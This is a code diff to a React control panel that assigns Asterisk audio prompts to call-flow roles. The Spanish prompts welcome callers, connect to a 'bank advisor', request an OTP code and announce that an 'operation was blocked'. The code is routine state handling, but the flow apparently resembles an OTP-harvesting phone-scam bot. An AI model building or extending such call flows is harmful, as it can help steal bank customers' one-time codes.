@@ -7,6 +7,8 @@ import {
   AsteriskConnectionSettings,
   SyncLogEntry,
   AudioPrompt,
+  AudioRole,
+  ActiveAudioAssignments,
   SystemUser,
   AstDbEntry,
   SqliteCdrRecord,
@@ -164,6 +166,48 @@ export default function App() {
   const [isSyncing, setIsSyncing] = useState(false);
   const [isCallSimulatorOpen, setIsCallSimulatorOpen] = useState(false);
   const [toastMessage, setToastMessage] = useState<{ text: string; type: 'success' | 'info' | 'error' } | null>(null);
+
+  // Active Asterisk Audio Assignments
+  const [activeAudioAssignments, setActiveAudioAssignments] = useState<ActiveAudioAssignments>({
+    press1_welcome: 'custom/bienvenida_corporativa',
+    agent_transfer: 'custom/conectar_asesor_banco',
+    press1_invalid: 'custom/opcion_invalida',
+    welcome_7777: 'custom/solicitar_codigo_otp',
+    otp_welcome: 'custom/solicitar_codigo_otp',
+    otp_wait: 'custom/un_momento_validando_informacion',
+    otp_success: 'custom/operacion_bloqueada_exito',
+    otp_failure: 'custom/token_invalido_reintente',
+  });
+
+  useEffect(() => {
+    fetch('/api/asterisk/audio/active-assignments')
+      .then((r) => r.json())
+      .then((data) => {
+        if (data.success && data.assignments) {
+          setActiveAudioAssignments(data.assignments);
+        }
+      })
+      .catch(() => {});
+  }, []);
+
+  const handleAssignRole = async (role: AudioRole, asteriskPath: string) => {
+    setActiveAudioAssignments((prev) => ({ ...prev, [role]: asteriskPath }));
+    try {
+      const res = await fetch('/api/asterisk/audio/assign', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ role, asteriskPath }),
+      });
+      const data = await res.json();
+      if (data.success && data.assignments) {
+        setActiveAudioAssignments(data.assignments);
+      }
+      showToast(`Audio "${asteriskPath}" asignado al rol "${role}".`);
+      addLog('AMI', `[AUDIO LIVE] Rol ${role} actualizado a ${asteriskPath}`, `AstDB actualizado.`);
+    } catch (e) {
+      showToast(`Error al asignar audio en Asterisk`);
+    }
+  };
 
   // Sync Telemetry Logs
   const [logs, setLogs] = useState<SyncLogEntry[]>([
@@ -833,6 +877,8 @@ export default function App() {
             onAssignToOtp={handleAssignToOtp}
             onAssignToAgentTransfer={handleAssignToAgentTransfer}
             onAssignTo7777={handleAssignTo7777}
+            activeAssignments={activeAudioAssignments}
+            onAssignRole={handleAssignRole}
           />
         )}
 
